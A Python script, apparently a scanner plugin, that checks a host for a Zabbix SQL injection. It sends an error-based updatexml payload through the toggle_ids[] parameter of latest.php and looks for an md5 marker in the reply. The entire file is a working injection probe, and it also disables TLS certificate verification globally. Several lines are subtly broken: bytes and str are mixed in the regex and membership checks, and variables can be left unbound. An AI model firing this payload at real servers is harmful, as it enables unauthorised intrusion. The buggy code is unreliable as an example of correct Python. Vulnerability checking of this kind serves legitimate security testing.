# -*- coding:utf-8 -*-

import urllib.request, urllib.error, urllib.parse
import re
import ssl

ssl._create_default_https_context = ssl._create_unverified_context


def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    msg = ''
    print('testing if new zabbix sql injection vul')
    try:
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
        request = opener.open(url + "/dashboard.php", timeout=10)
        res_html = request.read()
        if b'href="slides.php?sid=' in res_html:
            m = re.search(r'href="slides\.php\?sid=(.+?)">', res_html, re.M | re.I)
            if m:
                sid = m.group(1)
                payload = "/latest.php?output=ajax&sid={sid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=(select%20updatexml(1,concat(0x7e,(SELECT%20md5(666)),0x7e),1))".format(sid=sid)
                res_html = opener.open(url + payload, timeout=10).read()
                if b'fae0b27c451c728867a567e8c1bb4e5' in res_html:
                    msg = 'There is new zabbix sql injection vul on url: ' +url+ ' .'
                    number = 'v51'
                    return True,url,number,msg
                else:
                    pass
            else:
                pass
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        vulexists = False

    newurl = url + '/zabbix'
    try:
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
        request = opener.open(newurl + "/dashboard.php", timeout=10)
        res_html = request.read()
        if 'href="slides.php?sid=' in res_html:
            m = re.search(b'href="slides\.php\?sid=(.+?)">', res_html, re.M | re.I)
            if m:
                sid = m.group(1)
                payload = "/latest.php?output=ajax&sid={sid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=(select%20updatexml(1,concat(0x7e,(SELECT%20md5(666)),0x7e),1))".format(sid=sid)
                res_html = opener.open(newurl + payload, timeout=10).read()
                if b'fae0b27c451c728867a567e8c1bb4e5' in res_html:
                    msg = 'There is new zabbix sql injection vul on url: ' +newurl+ ' .'
                    number = 'v51'
                    print(msg)
                    return True,newurl,number,msg
                else:
                    pass
            else:
                pass
        else:
            pass


    except Exception as e:
        msg = str(e)
        number = 'v0'
        vulexists = False

    if len(msg) > 0:
        return vulexists,url,number,msg
    else:
        msg = 'There is no zabix sql injection vul'
        number = 'v0'
        return False,url,number,msg
